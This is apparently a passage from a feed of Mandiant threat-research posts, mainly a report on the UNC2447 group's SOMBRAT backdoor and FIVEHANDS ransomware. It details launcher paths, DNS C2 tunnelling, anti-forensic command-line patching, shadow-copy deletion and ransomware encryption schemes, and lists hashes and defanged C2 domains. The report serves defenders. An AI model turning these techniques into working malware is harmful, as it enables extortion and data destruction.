            href="https://attack.mitre.org/techniques/T1566/">Phishing</a>
              (T1566)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1566/002/">Spearphishing
                Link</a> (T1566.002)</li> </ul> </li> </ul> </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Execution</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a href="https://attack.mitre.org/techniques/T1204/">User
            Execution</a> (T1204)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1204/001/">Malicious
                Link</a> (T1204.001)</li> </ul> </li> <li>
            <a href="https://attack.mitre.org/techniques/T1059">Command
              and Scripting Interpreter</a> (T1059)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1059/005">Visual
                Basic</a> (T1059.005)</li> <li>
                <a
                href="https://attack.mitre.org/techniques/T1059/007">JavaScript/JScript</a>
              (T1059.007)</li> </ul> </li> </ul> </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Privilege Escalation</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a href="https://attack.mitre.org/techniques/T1055">Process
            Injection</a> (T1055)</li> </ul> </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Defense Evasion</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a
              href="https://attack.mitre.org/techniques/T1070">Indicator
              Removal on Host</a> (T1070)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1070/004">File
                Deletion</a> (T1070.004)</li> </ul> </li> <li>
            <a
              href="https://attack.mitre.org/techniques/T1027">Obfuscated
              Files or Information</a> (T1027)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1055">Process
            Injection</a> (T1055)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1112">Modify
            Registry</a> (T1112)</li> </ul> </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Discovery</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a href="https://attack.mitre.org/techniques/T1033">System
              Owner/User Discovery</a> (T1033)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1057">Process
            Discovery</a> (T1057)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1082">System
              Information Discovery</a> (T1082)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1087">Account
            Discovery</a> (T1087)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1518">Software
            Discovery</a> (T1518)</li> </ul> </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Collection</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a href="https://attack.mitre.org/techniques/T1113">Screen
          Capture</a> (T1113)</li> <li>
            <a href="https://attack.mitre.org/techniques/T1560">Archive
              Collected Data</a> (T1560)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1560/001">Archive
                  via Utility</a> (T1560.001)</li> </ul> </li> </ul>
      </td> </tr>
    <tr>
      <td width="311" valign="top"><p>Command and Control</p> </td> <td
        width="313" valign="top"><ul> <li>
            <a
              href="https://attack.mitre.org/techniques/T1071">Application
              Layer Protocol</a> (T1071)<ul> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1071/001">Web
                Protocols</a> (T1071.001)</li> <li>
                <a
                  href="https://attack.mitre.org/techniques/T1573/002">Asymmetric
                Cryptography</a> (T1573.002)</li> </ul> </li> </ul>
      </td> </tr></tbody></table>
 <h4>Acknowledgements</h4>
 <p>Thank you to Tyler McLellan, Dominik Weber, Michael Durakovich and
  Jeremy Kennelly for technical review of this content. In addition,
  thank you to Nico Paulo Yturriaga and Evan Reese for outstanding
  signature creation, and Ana Foreman for graphics support.</p>
http://www.fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html2021-05-04T14:00:00.000Z2021-05-05T00:59:10.898ZUNC2447 SOMBRAT and FIVEHANDS Ransomware: A Sophisticated Financial Threatnoemail@noemail.orgTyler McLellan<p>Mandiant has observed an aggressive financially motivated group,
  UNC2447, exploiting one SonicWall VPN zero-day vulnerability prior to
  a patch being available and deploying sophisticated malware previously
  reported by other vendors as SOMBRAT. Mandiant has linked the use of
  SOMBRAT to the deployment of ransomware, which has not been previously
  reported publicly.</p>
 <p>UNC2447 monetizes intrusions by extorting their victims first with
  FIVEHANDS ransomware followed by aggressively applying pressure
  through threats of media attention and offering victim data for sale
  on hacker forums. UNC2447 has been observed targeting organizations in
  Europe and North America and has consistently displayed advanced
  capabilities to evade detection and minimize post-intrusion forensics.</p>
 <p>Mandiant has observed evidence of UNC2447 affiliated actors
  previously using RAGNARLOCKER ransomware. Based on technical and
  temporal observations of HELLOKITTY and FIVEHANDS deployments,
  Mandiant suspects that HELLOKITTY may have been used by an overall
  affiliate program from May 2020 through December 2020, and FIVEHANDS
  since approximately January 2021.</p>
 <h4>Background</h4>
 <p>In November 2020, Mandiant created UNC2447, an uncategorized group
  observed using the novel WARPRISM PowerShell dropper to install BEACON
  at two Mandiant Managed Defense clients. Mandiant Managed Defence
  quicky neutralized these intrusions and did not observe attempts to
  deploy ransomware.</p>
 <p>In January and February 2021, Mandiant Consulting observed a novel
  rewrite of DEATHRANSOM—dubbed FIVEHANDS—along with SOMBRAT at multiple
  victims that were extorted. During one of the ransomware intrusions,
  the same WARPRISM and BEACON samples previously clustered under
  UNC2447 were observed. Mandiant was able to forensically link the use
  of WARPRISM, BEACON, SOMBRAT and FIVEHANDS to the same actor.</p>
 <p>Mandiant suspects that HELLOKITTY activity in late-2020 may be
  related to the overall affiliate program and that usage shifted to
  FIVEHANDS ransomware beginning in January 2021.</p>
 <ul> <li>In April 2021, Mandiant observed a private FIVEHANDS TOR chat
    using a HELLOKITTY favicon (Figure 1).</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2447-sombrat-fivehands/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: FIVEHANDS Hello Kitty icon</span></p>
 <p>When affiliate-based ransomware is observed by Mandiant,
  uncategorized clusters are assigned based on the infrastructure used,
  and in the case of UNC2447 were based on the SOMBRAT and Cobalt Strike
  BEACON infrastructure used across 5 intrusions between November 2020
  and February 2021. Generally, Mandiant uses caution even with novel
  malware such as SOMBRAT and WARPRISM and clusters each use rigorously
  according to all observed activity. For more information on
  uncategorized threats, refer to our post, &quot;<a
    href="/content/fireeye-www/en_US/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">DebUNCing
    Attribution: How Mandiant Tracks Uncategorized Threat Actors</a>.&quot;</p>
 <h4>SonicWall SMA 100 Series Appliance Vulnerability</h4>
 <p>CVE-2021-20016 is a critical SQL injection vulnerability that
  exploits unpatched SonicWall Secure Mobile Access SMA 100 series
  remote access products. A remote, unauthenticated attacker could
  submit a specially crafted query in order to exploit the
  vulnerability. Successful exploitation would grant an attacker the
  ability to access login credentials (username, password) as well as
  session information that could then be used to log into a vulnerable
  unpatched SMA 100 series appliance. This vulnerability only impacted
  the SMA 100 series and was patched by SonicWall in February 2021. For
  more information on this vulnerability, please refer to <a
    href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0001">SonicWall
    PSIRT advisory SNWLID-2021-0001</a>.</p>
 <h4>WARPRISM</h4>
 <p>WARPRISM is a PowerShell dropper that has been observed by Mandiant
  delivering SUNCRYPT, BEACON, and MIMIKATZ. WARPRISM is used to evade
  endpoint detection and will load its payload directly into memory.
  WARPRISM may be used by multiple groups.</p>
 <h4>FOXGRABBER</h4>
 <p>FOXGRABBER is a command line utility used to harvest FireFox
  credential files from remote systems. It contains the PDB path:
  C:\Users\kolobko\Source\Repos\grabff\obj\Debug\grabff.pdb. FOXGRABBER
  has also been observed in DARKSIDE ransomware intrusions.</p>
 <h4>BEACON Malleable Profiles</h4>
 <p>In the initial stages of an intrusion, UNC2447 uses the Cobalt
  Strike BEACON HTTPSSTAGER implant for persistence to communicate with
  command-and-control (C2) servers over HTTPS and has been observed
  using ‘chches_APT10’ and ‘Havex’ Malleable profiles.</p>
 <h4>UNC2447 Toolbox</h4>
 <p>During the recon and exfiltration stage of intrusions, UNC2447 has
  been observed using the following tools: ADFIND, BLOODHOUND, MIMIKATZ,
  PCHUNTER, RCLONE, ROUTERSCAN, S3BROWSER, ZAP and 7ZIP. UNC2447 may
  tamper with windows security settings, firewall rules, and antivirus protection.</p>
 <h4>SOMBRAT Overview</h4>
 <p>SOMBRAT was first reported by Blackberry Cylance in November 2020 as
    &quot;<a
    href="https://blogs.blackberry.com/en/2020/11/the-costaricto-campaign-cyber-espionage-outsourced">The
    CostaRicto Campaign: Cyber-Espionage Outsourced</a>&quot; as a
  potential espionage-for-hire criminal group. Mandiant has now observed
  SOMBRAT alongside FIVEHANDS ransomware intrusions.</p>
 <p>The SOMBRAT backdoor is packaged as a 64-bit Windows executable. It
  communicates with a configurable command and control (C2) server via
  multiple protocols, including DNS, TLS-encrypted TCP, and potentially
  WebSockets. Although the backdoor supports dozens of commands, most of
  them enable the operator to manipulate an encrypted storage file and
  reconfigure the implant. The backdoor's primary purpose is to download
  and execute plugins provided via the C2 server. In contrast to the
  SOMBRAT version published in November 2020, Mandiant observed
  additional obfuscation and armoring to evade detection, this SOMBRAT
  variant has been hardened to discourage analysis. Program metadata
  typically included by the compiler has been stripped and strings have
  been inlined and encoded via XOR-based routines.</p>
 <h4>The SOMBRAT Launcher</h4>
 <p>This SOMBRAT backdoor variant must be deployed alongside four
  additional resources that serve as launchers. They are typically
  installed to the hardcoded directory path `C:\ProgramData\Microsoft`. </p>
 <ul> <li>path: `C:\programdata\Microsoft\WwanSvc.bat` - launcher for
  `WwanSvc.txt`</li> <li>path: `C:\programdata\Microsoft\WwanSvc.txt` -
    decoder and launcher for `WwanSvc.c`</li> <li>path:
    `C:\programdata\Microsoft\WwanSvc.c` - decoder and launcher for
  `WwanSvc.b`</li> <li>path: `C:\programdata\Microsoft\WwanSvc.a` - XOR
  key</li> <li>path: `C:\programdata\Microsoft\WwanSvc.b` - encoded
    SOMBRAT backdoor</li> <li>path: `%TEMP%\&lt;possibly unique random
    name&gt;` - encrypted storage file</li> <li>path:
    `%TEMP%\&lt;possibly unique random name _&lt;integer&gt;` -
    encrypted storage file</li> <li>path: `C:\ProgramData\&lt;possibly
    unique random name ` - encrypted configuration file</li> </ul>
 <p>Other variations of the filenames were observed such as ntuser and wapsvc.</p>
 <h4>SOMBRAT Technical Details</h4>
 <p>The SOMBRAT backdoor is written in modern C++ and implemented as a
  collection of &quot;plugins&quot; that interoperate with one another.
  There are five plugins distributed with this variant: `core`,
  `network`, `storage`, `taskman`, and `debug` (the `config` plugin
  described by Blackberry is not present). The core plugins communicate
  with the C2 server via messages sent over a common networking layer;
  each plugin supports its own set of messages, and the backdoor
  protocol can be extended by dynamically loaded plugins.</p>
 <p>The `core` plugin coordinates state tracking, such as network
  connectivity, and dynamic plugin loading and unloading. The `network`
  plugin configures the networking layer used to communicate with the C2
  server, for example enabling the operator to switch between DNS and
  TCP protocols. The `storage` plugin exposes logical operations, such
  as read and write, for an encrypted file used to store plugins,
  resources, and arbitrary data. The `taskman` plugin enables the
  operator to list and kill processes on the compromised system.
  Finally, the `debuglog` plugin supports a single command to records
  debug messages.</p>
 <p>Given that the core plugins do not enable an operator directly
  execute arbitrary commands or reconfigure the system, the primary
  function of the SOMBRAT backdoor is to load plugins provided via the
  C2 server. These plugins may be shellcode or DLL modules to be
  dynamically loaded. The C2 server may instruct the backdoor to load
  the plugins directly or persist them into the encrypted storage file,
  where they may subsequently be reloaded, such as after upgrading the backdoor.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2447-sombrat-fivehands/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Malware author mark “No one is
    perfect except me.”</span></p>
 <p>SOMBRAT evades forensic analysis by patching the process memory used
  to record command line arguments. It replaces the initial command line
  with the base filename of the program executable, removing any
  arguments. This means that investigators that inspect a process
  listing via memory forensics will see the innocuous-looking command
  line `powershell.exe` rather than references to the uncommon filename
  such as `WwanSvc.c`.</p>
 <h4>SOMBRAT Network Communications</h4>
 <p>The SOMBRAT backdoor can communicate with its C2 server using both
  DNS and a proxy-aware, TLS-encrypted stream protocol. By default, the
  backdoor uses the DNS protocol; however, this can be reconfigured by
  the C2 server. Mandiant observed the domains feticost[.]com and
  celomito[.]com used for DNS C2 communications.</p>
 <p>When the backdoor communicates via its DNS protocol, it constructs
  and resolves FQDNs, interpreting the DNS results to extract C2
  messages. The authoritative DNS server embeds data within the IP
  address field of DNS A record results and within the Name
  Administrator field of DNS TEXT record results. By making many
  requests to unique subdomains of the C2 domain, the backdoor can
  slowly transmit information a few bytes at a time.</p>
 <h4>Ransomware Similarities</h4>
 <p>Beginning in October 2020, Mandiant observed samples of a customized
  version of DEATHRANSOM. This newly modified version removed the
  language check feature (Figure 3 shows the language check of DEATHRANSOM).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2447-sombrat-fivehands/fig3.png" alt="" />
  <br /> Figure 3: Language check from <a
    href="https://www.fortinet.com/blog/threat-research/death-ransom-new-strain-ransomware">Fortinet blog</a></p>
 <ul> <li>HELLOKITTY ransomware—used to <a
      href="https://www.bleepingcomputer.com/news/security/HELLOKITTY-ransomware-behind-cd-projekt-red-cyberattack-data-theft/">target
      Polish video game developer</a> CD Projekt Red—is reportedly built
    from DEATHRANSOM.<ul> <li>HELLOKITTY is named after a mutex named
        ‘HELLOKITTYMutex,’ used when the malware executable is launched
        (see Figure 4).</li> </ul> </li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2447-sombrat-fivehands/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: HELLOKITTY mutex shown in
    Process Explorer</span></p>
 <ul> <li>CEMIG (Companhia Energética de Minas Gerais), a Brazilian
    electric power company, <a
      href="https://www.cisoadvisor.com.br/ataque-de-ransomware-na-cemig-derruba-sites-e-atendimento/">revealed
      on Facebook</a> in late December 2020 that it was a <a
      href="https://www.computerweekly.com/news/252496143/HelloKitty-almost-certainly-behind-CD-Projekt-ransomware-attack">victim
      of HELLOKITTY cyber attack</a>.</li> </ul>
 <p>In January 2021, Mandiant observed a new ransomware deployed against
  a victim and assigned the name FIVEHANDS.</p>
 <ul> <li>Analysis of FIVEHANDS revealed high similarity to DEATHRANSOM,
    sharing several features, functions, and coding similarities. Absent
    in FIVEHANDS is a language check, similar to HELLOKITTY</li>
    <li>Both DEATHRANSOM and FIVEHANDS drops a ransom note in all
    non-excluded directories</li> </ul>
 <h4>Technical Comparison of FIVEHANDS, HELLOKITTY and DEATHRANSOM</h4>
 <p>DEATHRANSOM is written in C while the other two families are written
  in C++. DEATHRANSOM uses a distinct series of do/while loops to
  enumerate through network resources, logical drives, and directories.
  It also uses QueueUserWorkItem to implement thread pooling for its
  file encryption threads.</p>
 <p>HELLOKITTY is written in C++, but reimplements a significant portion
  of DEATHRANSOM's functionality using similar loop operations and
  thread pooling via QueueUserWorkItem. The code structure to enumerate
  network resources, logical drives, and perform file encryption is very
  similar. Additionally, HELLOKITTY and DEATHRANSOM share very similar
  functions to check for the completion status of their encryption
  threads before exiting.</p>
 <p>FIVEHANDS is written in C++ and although high level functionality is
  similar, the function calls and code structure to implement the
  majority of the functionality is written differently. Also, instead of
  executing threads using QueueUserWorkItem, FIVEHANDS uses
  IoCompletionPorts to more efficiently manage its encryption threads.
  FIVEHANDS also uses more functionality from the C++ standard template
  library (STL) than does HELLOKITTY.</p>
 <h4>Deletion of Volume Shadow Copies</h4>
 <p>DEATHRANSOM, HELLOKITTY, and FIVEHANDS use the same code to delete
  volume shadow copies via WMI by performing the query select * from
  Win32_ShadowCopy and then deleting each instance returned by its id.</p>
 <h4>Encryption Operations</h4>
 <p>Each of these three malware families utilizes a similar encryption
  scheme. An asymmetric public key is either hard-coded or generated. A
  unique symmetric key is generated for each encrypted file.</p>
 <ul> <li>After each file is encrypted, the asymmetric key will encrypt
    the symmetric key and append it to the encrypted file. Additionally,
    a unique four byte magic value is appended to the end of the
    encrypted file. The malware checks for these magic bytes to ensure
    it does not encrypt a previously encrypted file again.</li>
    <li>DEATHRANSOM and HELLOKITTY implement the file encryption
    operations using a very similar code structure and flow.</li>
    <li>FIVEHANDS implements its file encryption with a differing code
    structure and uses different embedded encryption libraries.</li>
    <li>In addition to the symmetric key, HELLOKITTY and FIVEHANDS also
    encrypts file metadata with the public key and appends this to the
    encrypted file.</li> <li>DEATHRANSOM generates an RSA key pair while
    HELLOKITTY and FIVEHANDS use an embedded RSA or NTRU public
  key.</li> </ul>
 <h4>DEATHRANSOM Encryption</h4>
 <ul> <li>DEATHRANSOM creates an RSA-2048 public and private key pair.
    Using an Elliptic-curve Diffie–Hellman (ECDH) routine implemented
    with Curve25519, it computes a shared secret using two input values:
    1) 32 random bytes from a RtlGenRandom call and 2) a hardcoded 32
    byte value (attacker's public key). It also create a Curve25519
    public key. The shared secret is SHA256 hashed and used as the key
    to Salsa20 encrypt the RSA public and private keys.</li> <li>The RSA
    public key is used to encrypt the individual symmetric keys that are
    used to encrypt each file. A Base64 encoded version of the encrypted
    RSA keys and the victim’s Curve25519 public key is included in the
    ransom note, providing the threat actors the information needed to
    decrypt the victim's files.</li> <li>For the symmetric key,
    DEATHRANSOM calls RtlGenRandom to generate 32 random bytes. This is
    the 32 byte key used to AES encrypt each file. After the file is
    encrypted, the AES key is encrypted with the public RSA key and
    appended to the file.</li> <li>DEATHRANSOM lastly appends the four
    magic bytes of AB CD EF AB at the end of the encrypted file and uses
    this as a check to ensure that it does not encrypt an already
    encrypted file.</li> <li>The analyzed DEATHRANSOM sample used for
    comparison does not change the file extension.</li> </ul>
 <h4>HELLOKITTY Encryption</h4>
 <ul> <li>HELLOKITTY contains an embedded RSA-2048 public key. This
    public key is SHA256 hashed and used as the victim ID within the
    ransom note. This RSA pubic key is also used to encrypt each file's
    symmetric key.</li> <li>For the symmetric key, HelloKitty generates
    a 32 byte seed value based on the CPU timestamp. A Salsa20 key is
    generated and encrypts a second 32 byte seed value. The encrypted
    result is XOR’d with the first seed, resulting in a 32 byte key used
    to AES encrypt each file.</li> <li>After each file is encrypted, the
    original file size, magic value of DE C0 AD BA, and AES key are
    encrypted with the public RSA key and appended to the file.
    HELLOKITTY and FIVEHANDS appends this additional metadata to the
    encrypted file, while DEATHRANSOM does not.</li> <li>Lastly it
    appends the four magic bytes DA DC CC AB to the end of the encrypted
  file.</li> <li>Depending on the version, HELLOKITTY may or may not
    change the file extension.</li> <li>Other samples of HELLOKITTY have
    used an embedded NTRU public key instead of RSA.</li> </ul>
 <h4>FIVEHANDS Encryption</h4>
 <ul> <li>FIVEHANDS uses an embedded NTRU public key. This NTRU key is
    SHA512 hashed and the first 32 bytes are used as the victim ID
    within the ransom note. This NTRU pubic key is also used to encrypt
    each file's symmetric key.</li> <li>For the symmetric key, FIVEHANDS
    uses an embedded generation routine to produce 16 random bytes used
    for an AES key to encrypt each file.</li> <li>After each file is
    encrypted, the original file size, magic value of DE C0 AD BA, and
    AES key are encrypted with the public NTRU key and appended to the
  file.</li> <li>The four magic bytes DB DC CC AB are appended to the
    end of the encrypted file.</li> <li>FIVEHANDS includes additional
    code not found in DEATHRANSOM and HELLOKITTY to use the Windows
    Restart Manager to close a file currently in use so that it can be
    unlocked and successfully encrypted.</li> <li>The encrypted file
    extension is changed to .crypt  extension</li> <li>FIVEHANDS's
    encryption flow and sequence is very different from the other two,
    partially because it incorporates asynchronous I/O requests and uses
    different embedded encryption libraries.</li> </ul>
 <h4>FIVEHANDS Encrypted Dropper</h4>
 <p>One significant change between DEATHRANSOM and FIVEHANDS is the use
  of a memory-only dropper, which upon execution, expects a command line
  switch of -key followed by the key value necessary to perform
  decryption of its payload. The payload is stored and encrypted with
  AES-128 using an IV of “85471kayecaxaubv”. The decrypted FIVEHANDS
  payload is immediately executed after decryption. To date, Mandiant
  has only observed encrypted droppers with a common imphash of 8517cf209c905e801241690648f36a97.</p>
 <h4>CLI arguments</h4>
 <p>FIVEHANDS can receive a CLI argument for a path, this limits the
  ransomware's file encryption activities to the specified directory.
  DEATHRANSOM and HELLOKITTY do not accept CLI arguments.</p>
 <h4>Locale and Mutex checks</h4>
 <p>DEATHRANSOM performs language ID and keyboard layout checks. If
  either of these match Russian, Kazakh, Belarusian, Ukrainian or Tatar
  it exits. Neither HELLOKITTY or FIVEHANDS perform language ID or
  keyboard checks.</p>
 <p>HELLOKITTY performs a mutex check while the other two do not perform
  mutex checks.</p>
 <h4>File Exclusions</h4>
 <p>DEATHRANSOM and HELLOKITTY both exclude the same directories and files:</p>
 <p>programdata, $recycle.bin, program files, windows, all users,
  appdata, read_me.txt, autoexec.bat, desktop.ini, autorun.inf,
  ntuser.dat, iconcache.db, bootsect.bak, boot.ini, ntuser.dat.log, or thumbs.db.</p>
 <p>The exclusions for FIVEHANDS are more extensive and contain
  additional files and directories to ignore.</p>
 <h4>Additional Differences</h4>
 <ul> <li>DEATHRANSOM makes an external HTTPS connection to download a
    file. Neither HELLOKITTY or FIVEHANDS initiate network
  connections.</li> <li>HELLOKITTY contains code to set the victims
    wallpaper to a ransom related image. The other samples do not have
    this functionality</li> <li>Different versions of DEATHRANSOM and
    HELLOKITTY are known to change the file extension</li> <li>Different
    versions of HELLOKITTY are known to check for specific processes to
  terminate.</li> </ul>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="165"><p>
          <b>Feature</b></p> </td> <td width="153"><p>
          <b>FIVEHANDS</b></p> </td> <td width="153" valign="top"><p>
          <b>HELLOKITTY</b></p> </td> <td width="153"><p>
          <b>DEATHRANSOM</b></p> </td> </tr>
    <tr>
      <td width="165"><p>Programming Language</p> </td> <td
        width="153"><p>C++</p> </td> <td width="153"><p>C++</p> </td>
        <td width="153"><p>C</p> </td> </tr>
    <tr>
      <td width="165"><p>Symmetric Encryption</p> </td> <td
          width="153"><p>AES 128</p> </td> <td width="153"><p>AES
        256</p> </td> <td width="153"><p>AES 256</p> </td> </tr>
    <tr>
      <td width="165"><p>Asymmetric Encryption</p> </td> <td
          width="153"><p>Embedded NTRU Key</p> </td> <td
          width="153"><p>Embedded RSA or NTRU Key</p> </td> <td
          width="153"><p>Curve25519 ECDH and RSA key creation</p> </td> </tr>
    <tr>
      <td width="165"><p>Same directory and file name exclusions</p>
      </td> <td width="153"><p>No</p> </td> <td width="153"><p>Yes</p>
      </td> <td width="153"><p>Yes</p> </td> </tr>
    <tr>
      <td width="165"><p>Accepts CLI Arguments</p> </td> <td
        width="153"><p>Yes</p> </td> <td width="153"><p>No</p> </td> <td
        width="153"><p>No</p> </td> </tr>
    <tr>
      <td width="165"><p>Network Connections</p> </td> <td
        width="153"><p>No</p> </td> <td width="153"><p>No</p> </td> <td
        width="153"><p>Yes</p> </td> </tr>
    <tr>
      <td width="165"><p>Locale Check</p> </td> <td
        width="153"><p>No</p> </td> <td width="153"><p>No</p> </td> <td
        width="153"><p>Yes</p> </td> </tr>
    <tr>
      <td width="165"><p>Mutex Check</p> </td> <td width="153"><p>No</p>
      </td> <td width="153"><p>Yes</p> </td> <td width="153"><p>No</p>
      </td> </tr>
    <tr>
      <td width="165"><p>Bytes Appended to Encrypted Files</p> </td> <td
          width="153"><p>DB DC CC AB</p> </td> <td width="153"><p>DA DC
          CC AB</p> </td> <td width="153"><p>AB CD EF AB</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Ransomware feature comparison</span></p>
 <h4>Conclusion</h4>
 <p>Mandiant observed SOMBRAT and FIVEHANDS ransomware by the same group
  since January 2021. While similarities between HELLOKITTY and
  FIVEHANDS are notable, ransomware may be used by different groups
  through underground affiliate programs. Mandiant will assign an
  uncategorized cluster based on multiple factors including
  infrastructure used during intrusions and as such, not all SOMBRAT or
  FIVEHANDS ransomware intrusions may have been conducted by UNC2447.
  WARPRISM and FOXGRABBER have been used in SUNCRYPT and DARKSIDE
  ransomware demonstrating additional complexity and sharing between
  different ransomware affiliate programs.</p>
 <h4>Indicators</h4>
 <h5>SOMBRAT UNC2447</h5>
 <ul> <li>87c78d62fd35bb25e34abb8f4caace4a</li>
    <li>6382d48fae675084d30ccb69b4664cbb
    (31dcd09eb9fa2050aadc0e6ca05957bf unxored)</li> </ul>
 <h5>SOMBRAT Launcher</h5>
 <ul> <li>cf1b9284d239928cce1839ea8919a7af (wwansvc.a XOR key)</li>
    <li>4aa3eab3f657498f52757dc46b8d1f11 (wwansvc.c)</li>
    <li>1f6495ea7606a15daa79be93070159a8 (wwansvc.bat)</li>
    <li>31dcd09eb9fa2050aadc0e6ca05957bf (wwansvc.b)</li>
    <li>edf567bd19d09b0bab4a8d068af15572 (wwansvc.b)</li>
    <li>a5b26931a1519e9ceda04b4c997bb01f (wwansvc.txt)</li>
    <li>f0751bef4804fadfe2b993bf25791c49
    (4aa3eab3f657498f52757dc46b8d1f11 unxored)</li>
    <li>87c78d62fd35bb25e34abb8f4caace4a
    (edf567bd19d09b0bab4a8d068af15572 unxored)</li> </ul>
 <h5>SOMBRAT domains</h5>
 <ul> <li>Celomito[.]com (unc2447)</li> <li>Feticost[.]com
  (unc2447)</li> <li>Cosarm[.]com</li> <li>Portalcos[.]com</li> </ul>
 <h5>FIVEHANDS</h5>
 <ul> <li>39ea2394a6e6c39c5d7722dc996daf05</li>
  <li>f568229e696c0e82abb35ec73d162d5e</li> </ul>
 <h5>FIVEHANDS Encrypted Dropper</h5>
 <ul> <li>6c849920155f48d4b4aafce0fc49eb5b</li>
  <li>22d35005e926fe29379cb07b810a6075</li>
  <li>57824214710bc0cdb22463571a72afd0</li>
  <li>87c0b190e3b4ab9214e10a2d1c182153</li>
  <li>1b0b9e4cddcbcb02affe9c8124855e58</li>
  <li>46ecc24ef6d20f3eaf71ff37610d57d1</li>
  <li>1a79b6d169aac719c9323bc3ee4a8361</li>
  <li>a64d79eba40229ae9aaebbd73938b985</li> </ul>
 <h5>HELLOKITTY</h5>
 <ul> <li>136bd70f7aa98f52861879d7dca03cf2</li>
  <li>06ce6cd8bde756265f95fcf4eecadbe9</li>
  <li>af568e8a6060812f040f0cb0fd6f5a7b</li>
  <li>d96adf82f061b1a6c80699364a1e3208</li> </ul>
 <h5>DEATHRANSOM</h5>
 <ul> <li>c50ab1df254c185506ab892dc5c8e24b</li> </ul>
 <h5>WARPRISM</h5>
 <ul> <li>c925822c6d5175c30ba96388b07e9e16 (unc2447)</li>
  <li>c171bcd34151cbcd48edbce13796e0ed</li>
  <li>d87fcd8d2bf450b0056a151e9a116f72</li>
  <li>f739977004981fbe4a54bc68be18ea79</li>
  <li>e18b27f75c95b4d50bfcbcd00a5bd6c5</li>
  <li>df6e6b3e53cc713276a03cce8361ae0f</li>
  <li>1cd03c0d00f7bfa7ca73f7d73677d8f8</li>
  <li>8071f66d64395911a7aa0d2057b9b00d</li>
  <li>c12a96e9c50db5f8b0b3b5f9f3f134f0</li>
  <li>e39184eacba2b05aaa529547abf41d2b</li>
  <li>09a05a2212bd2c0fe0e2881401fbff17</li>
  <li>8226d7615532f32eca8c04ac0d41a9fd</li>
  <li>a01a2ba3ae9f50a5aa8a5e3492891082</li>
  <li>29e53b32d5b4aae6d9a3b3c81648653c</li>
  <li>a809068b052bc209d0ab13f6c5c8b4e7</li> </ul>
 <h5>BEACON UNC2447</h5>
 <ul> <li>64.227.24[.]12 Havex Profile January 2021</li>
    <li>157.230.184[.]142  chches_ APT10 Profile November 2020-January
  2021</li> <li>74c688a22822b2ab8f18eafad2271cac</li>
  <li>7d6e57cbc112ebd3d3c95d3c73451a38</li> </ul>
 <h5>FOXGRABBER</h5>
 <ul> <li>4d3d3919dda002511e03310c49b7b47f</li> </ul>
 <h4>FireEye Detections</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="631"> <tbody>
    <tr>
      <td width="259" valign="top"><p>FireEye Network Security</p>
          <p>FireEye Email Security</p> <p>FireEye Detection On
        Demand</p> <p>FireEye Malware Analysis</p> <p>FireEye Malware
          File Protect</p> <p>
          <b> </b></p> </td> <td width="372"
        valign="top"><p>FIVEHANDS</p> <ul>
          <li>FE_Loader_Win32_Generic_162</li>
          <li>FE_Ransomware_Win32_FIVEHANDS_1</li>
          <li>Malware.Binary.exe</li>
            <li>Ransomware.Win.Generic.MVX<br /> </li> </ul>
        <p>SOMBRAT</p> <ul> <li>FE_Backdoor_Win64_SOMBRAT_1</li>
          <li>Backdoor.Win.SOMBRAT</li> <li>Malware.Binary.exe</li>
          <li>Backdoor.Win.SOMBRAT.MVX</li>
          <li>FEC_Trojan_PS1_Generic_7</li>
          <li>FEC_Trojan_PS1_Generic_8</li>
          <li>FEC_Trojan_BAT_Generic_5</li> </ul> <p>HELLOKITTY</p> <ul>
          <li>Ransomware.Win.Generic.MVX</li>
          <li>Malware.Binary.exe</li>
          <li>Ransomware.Win.HELLOKITTY.MVX</li>
          <li>FE_Ransomware_Win_HELLOKITTY_1</li>
            <li>FE_Ransomware_Win32_HELLOKITTY_1<br /> </li> </ul>
        <p>DEATHRANSOM</p> <ul> <li>FE_Loader_Win32_Generic_92</li>
          <li>Ransomware.Win.Generic.MVX</li>
            <li>Malware.Binary.exe<br /> </li> </ul> <p>BEACON</p> <ul>
          <li>FE_Loader_Win32_BLUESPINE_1</li> <li>Backdoor.BEACON</li>
            <li>Malware.Binary.exe<br /> </li> </ul> <p>WARPRISM</p>
          <ul> <li>FE_Loader_PS1_WARPRISM_1</li>
          <li>FEC_Loader_PS1_WARPRISM_1</li> <li>Backdoor.BEACON</li>
          <li>Trojan.Generic</li> <li>Trojan.Win.SYSTEMBC</li>
          <li>Backdoor.Meterpreter</li> <li>Loader.PS1.WARPRISM.MVX</li>
